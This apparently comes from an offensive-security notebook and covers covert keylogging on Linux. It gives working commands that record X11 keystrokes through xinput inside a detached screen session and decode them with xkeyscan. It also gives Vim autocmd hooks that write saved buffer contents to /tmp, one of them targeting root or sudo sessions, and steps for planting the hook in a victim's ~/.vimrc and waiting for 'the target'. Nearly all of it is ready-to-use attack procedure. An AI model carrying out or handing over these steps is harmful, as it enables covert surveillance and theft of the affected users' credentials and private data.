# Keylogging

## 01 - Script

Run a multiplexer terminal program to leave it in the background.

```
$ screen -S keylogger

$ export DISPLAY=:0.0

$ export | grep -i display
```

Exporting the keyboard mapping will show the keybindings that can be translated to actual keystrokes.

```
$ xmodmap -pke > xmodmap-pke.txt

$ head -n20 xmodmap-pke.txt
```

Find the virtual core keyboard to record keystrokes then detach the session to leave it in the background with (`CTRL+D`).

```
$ xinput list

$ script -c "xinput test <X_id>" -a xinput-keylogger.log
```

While it's still running in the background use `xkeyscan` ( a python script is included in the references below) to convert the decimal base 10 values to printable ASCII characters.

```
$ python xkeyscan.py xinput-keylogger.log
```

## 02 - Vim

### 2.1 - Common File Destinations

```
$HOME/.vimrc
$HOME/.vim/plugin/settings.vim
```

### 2.2 - Vim scripts for logging keystrokes

Normal user

```
:autocmd BufWritePost * :silent :w! >> /tmp/vim-keystrokes.txt
```

Under elevated user context when the user is running as `sudo`.

```
:if $USER == "root"
:autocmd BufWritePost * :silent :w! >> /tmp/vim-keystrokes.txt
:endif
```

### 2.3 - Insert keylogging configuration

Gather timestamps and backup the config resource file. Also try to improvise by instead of getting rid of the rest of the vim config content's. Modify it to ensure it contains no syntax errors. Then wait for the target when he interacts with VIM.

```
$ stat ~/.vimrc
$ cp ~/.vimrc /tmp/.vimrc.bak
$ echo "" > ~/.vimrc
$ cat ~/.vimrc
:autocmd BufWritePost * :silent :w! >> /tmp/vim-keystrokes.txt
```

---
## References

- [[Screen]]

- [RedHat: Record your terminal with script and scriptreplay](https://www.redhat.com/sysadmin/record-terminal-script-scriptreplay )

- [xkeyscan](https://github.com/porterhau5/xkeyscan)

- [Natively Keylogging NIX Systems](http://legacy.popped.io/2016/06/natively-keylogging-nix-systems.html)

- [Using xkeyscan to Parse an X-Based Linux Keylogger](https://porterhau5.com/blog/xkeyscan-parse-linux-keylogger/)